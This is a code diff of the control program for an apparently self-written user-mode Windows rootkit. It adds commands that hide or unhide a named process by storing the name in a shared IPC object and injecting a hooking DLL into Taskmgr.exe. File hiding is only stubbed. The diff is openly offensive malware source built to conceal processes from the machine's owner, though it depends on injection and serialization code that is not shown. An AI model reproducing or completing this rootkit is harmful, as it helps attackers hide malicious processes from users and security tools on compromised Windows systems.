@@ -10,42 +10,68 @@
 
 using namespace std;
 
+#define PROCESS_DLL "S:\\MalwareDeveloped\\S12URootkit\\processHooks\\x64\\Release\\processHooks.dll"
+#define PROCESS_DLL_W L"S:\\MalwareDeveloped\\S12URootkit\\processHooks\\x64\\Release\\processHooks.dll"
+
 int main(int argc, char* argv[]){        
     unordered_map<string, vector<string>> injectionMap;
-    vector<string> agentDescriptor;
-
     Serialitzator serialitzator("ipcObject");
 
-    vector<wchar_t*> stringsToSerialize;
-    wstring str1 = L"explorer.exe";
-    wstring str2 = L"notepad.exe";
-    wstring str3 = L"cmd.exe";
-    stringsToSerialize.push_back((wchar_t*)str1.c_str());
-    stringsToSerialize.push_back((wchar_t*)str2.c_str());
-    stringsToSerialize.push_back((wchar_t*)str3.c_str());
+    // Process
+    vector<wchar_t*> processesToHide;    
+    wstring str1 = L"UserMode-Rootkit.exe";
+    processesToHide.push_back((wchar_t*)str1.c_str());
 
-    serialitzator.serializeVectorWCharTPointer(stringsToSerialize,L"agentMapped");
+    // File
+    vector<string> filesToHide;
+    string str2 = "UserMode-Rootkit.exe";
+    filesToHide.push_back(str2);
+
+    serialitzator.serializeVectorWCharTPointer(processesToHide, L"processAgentMapped");
+    //serialitzator.serializeStringVector(filesToHide, "fileAgentMapped");
     
-    /*vector<wchar_t*> deserializedStrings = serialitzator.deserializeWCharTPointerVector(L"agentMapped");
-    for (auto& str : deserializedStrings) {
-		wcout << str << endl;
-	}*/
-
-    getchar();
 
     // - rootkit.exe process hide processname.exe
     if (argc == 4 && strcmp(argv[1], "process") == 0 && strcmp(argv[2], "hide") == 0) {
 		char* processName = argv[3];
-
+        vector<wchar_t*> deserializedStrings = serialitzator.deserializeWCharTPointerVector(L"processAgentMapped");
+        wstring processNameW(processName, processName + strlen(processName));
+        deserializedStrings.push_back(&processNameW[0]);
+        serialitzator.serializeVectorWCharTPointer(deserializedStrings, L"agentMapped");
+        injectionMap["Taskmgr.exe"] = { PROCESS_DLL };
+        injectDlls(injectionMap);
 	}
+
+    // - rootkit.exe process unhide processname.exe
+    if (argc == 4 && strcmp(argv[1], "process") == 0 && strcmp(argv[2], "unhide") == 0) {
+        char* processName = argv[3];
+        vector<wchar_t*> deserializedStrings = serialitzator.deserializeWCharTPointerVector(L"agentMapped");
+        wstring processNameW(processName, processName + strlen(processName));
+        for (auto it = deserializedStrings.begin(); it != deserializedStrings.end(); ++it) {
+            if (wcscmp(*it, &processNameW[0]) == 0) {
+				deserializedStrings.erase(it);
+				break;
+			}
+		}
+        serialitzator.serializeVectorWCharTPointer(deserializedStrings, L"agentMapped");
+        injectionMap["Taskmgr.exe"] = { PROCESS_DLL };
+        injectDlls(injectionMap);
+    }
+
+    if (argc == 4 && strcmp(argv[1], "file") == 0 && strcmp(argv[2], "hide") == 0){
+		// - rootkit.exe file hide filename.exe
+        vector<string> deserializedStrings = serialitzator.deserializeStringVector("fileAgentMapped");
+        string fileName = argv[3];
+        deserializedStrings.push_back(fileName);
+        //serialitzator.serializeStringVector(deserializedStrings, "fileAgentMapped");
+	}
+
+    if (argc == 4 && strcmp(argv[1], "file") == 0 && strcmp(argv[2], "unhide") == 0) {
+        // - rootkit.exe file unhide filename.exe
+    }
     
 
-    // Inject DLL's into processes
-    //injectionMap["taskmgr.exe"] = { "C:\\Users\\Public\\mscde.dll","C:\\Users\\Public\\msc23.dll"};
-    //injectionMap["explorer.exe"] = { "C:\\Users\\Public\\mscde.dll" };
-   // injectionMap["regedit.exe"] = { "C:\\Users\\Public\\mscde.dll" };
-
-    //injectDlls(injectionMap);
+    getchar();
 }
 
 
